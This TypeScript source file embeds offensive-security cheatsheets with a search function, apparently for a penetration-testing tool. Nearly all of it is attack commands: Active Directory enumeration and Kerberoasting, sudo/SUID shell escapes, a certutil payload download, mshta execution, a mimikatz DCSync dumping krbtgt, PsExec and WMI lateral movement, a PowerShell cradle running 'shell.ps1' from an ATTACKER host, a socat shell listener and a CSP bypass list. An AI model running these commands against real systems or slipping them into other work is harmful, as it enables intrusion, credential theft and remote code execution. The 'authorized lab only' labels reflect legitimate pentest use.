/** Embedded quick-reference cheatsheets (GTFOBins / LOLBins / WADComs / AD style). Full DBs: external links. */

export type CheatsheetEntry = { id: string; title: string; tags: string[]; body: string };

export const CHEATSHEETS: CheatsheetEntry[] = [
    {
        id: 'ad-enum',
        title: 'AD — Quick enumeration',
        tags: ['ad', 'active directory', 'bloodhound', 'ldap', 'kerberos'],
        body: `# Active Directory (authorized lab only)

## LDAP
\`\`\`bash
ldapsearch -x -H ldap://DC01.corp.local -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName
\`\`\`

## PowerView
\`\`\`powershell
Import-Module .\\PowerView.ps1
Get-DomainUser -Properties samaccountname,mail,memberof
Get-DomainComputer | Select dnsname,operatingsystem
\`\`\`

## BloodHound
\`\`\`powershell
.\\SharpHound.exe -c All --domain corp.local
\`\`\`

## Kerberoast (in-scope only)
\`\`\`powershell
Get-DomainUser -SPN | select samaccountname,serviceprincipalname
\`\`\``,
    },
    {
        id: 'gtfobins-sudo',
        title: 'GTFOBins — sudo / SUID patterns',
        tags: ['gtfobins', 'linux', 'sudo', 'suid', 'privesc'],
        body: `# Unix privesc patterns (verify binary + flags on target)

| Binary | Technique |
|--------|-----------|
| \`find\` | \`find . -exec /bin/sh -p \\\\; -quit\` |
| \`vim\` | \`:!/bin/sh\` or \`vim -c ':py import os; os.execl("/bin/sh","sh","-p")'\` |
| \`python\` | \`python -c 'import os; os.execl("/bin/sh","sh","-p")'\` |
| \`awk\` | \`awk 'BEGIN {system("/bin/sh")}'\` |

Full index: https://gtfobins.github.io/`,
    },
    {
        id: 'lolbins-cmd',
        title: 'LOLBins — Windows living-off-the-land',
        tags: ['lolbins', 'windows', 'defense evasion', 'execution'],
        body: `# Common LOLBins (authorized engagement)

| Binary | Use |
|--------|-----|
| \`certutil.exe\` | Download: \`certutil -urlcache -split -f http://x/p payload.exe\` |
| \`mshta.exe\` | \`mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd""",0)\` |
| \`regsvr32\` | Squiblydoo / scriptlet loading (legacy) |
| \`rundll32\` | DLL execution / proxy |

Full project: https://lolbas-project.github.io/`,
    },
    {
        id: 'wadcoms-ad',
        title: 'WADComs — Windows AD offensive',
        tags: ['wadcoms', 'ad', 'lateral', 'dcsync'],
        body: `# Windows / AD command snippets

## DCSync (Domain Admin + in scope)
\`\`\`powershell
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
\`\`\`

## PsExec lateral
\`\`\`cmd
PsExec.exe \\\\TARGET -u CORP\\\\user -p pass cmd
\`\`\`

## RDP
\`\`\`cmd
mstsc /v:TARGET
\`\`\`

Reference: https://wadcoms.github.io/`,
    },
    {
        id: 'ad-lateral',
        title: 'AD — Lateral movement',
        tags: ['ad', 'psexec', 'wmi', 'winrm', 'lateral'],
        body: `# Lateral movement (authorized)

| Technique | Command |
|-----------|---------|
| PsExec | \`PsExec.exe \\\\TARGET -u CORP\\\\user -p pass cmd\` |
| WMI | \`wmic /node:TARGET process call create "cmd"\` |
| WinRM | \`Enter-PSSession -ComputerName TARGET -Credential $cred\` |`,
    },
    {
        id: 'gtfobins-capabilities',
        title: 'GTFOBins — capabilities / tar / git',
        tags: ['gtfobins', 'capabilities', 'tar', 'git', 'shell'],
        body: `# Capability abuse

| Binary | Use |
|--------|-----|
| \`tar\` | \`tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh\` |
| \`git\` | \`git help config\` then \`!/bin/sh\` |
| \`busybox\` | \`busybox sh\` if SUID or sudo NOPASSWD |`,
    },
    {
        id: 'lolbins-powershell',
        title: 'LOLBins — PowerShell cradles',
        tags: ['lolbins', 'powershell', 'download'],
        body: `# Download cradles (lab only)

\`\`\`powershell
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')
\`\`\``,
    },
    {
        id: 'listener-nc',
        title: 'Listeners — nc / socat',
        tags: ['listener', 'netcat', 'socat'],
        body: `\`\`\`bash
nc -lvnp 4444
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
\`\`\``,
    },
    {
        id: 'csp-bypass',
        title: 'CSP bypass checklist',
        tags: ['csp', 'xss', 'jsonp', 'bypass'],
        body: `- unsafe-inline → inline handlers
- Wildcard script-src → JSONP gadgets
- Missing base-uri → base tag injection
- data: in script-src → data URI scripts`,
    },
];

export function searchCheatsheets(query: string): CheatsheetEntry[] {
    const q = query.toLowerCase().trim();
    if (!q) return CHEATSHEETS;
    return CHEATSHEETS.filter(
        (c) =>
            c.title.toLowerCase().includes(q) ||
            c.tags.some((t) => t.includes(q)) ||
            c.body.toLowerCase().includes(q),
    );
}
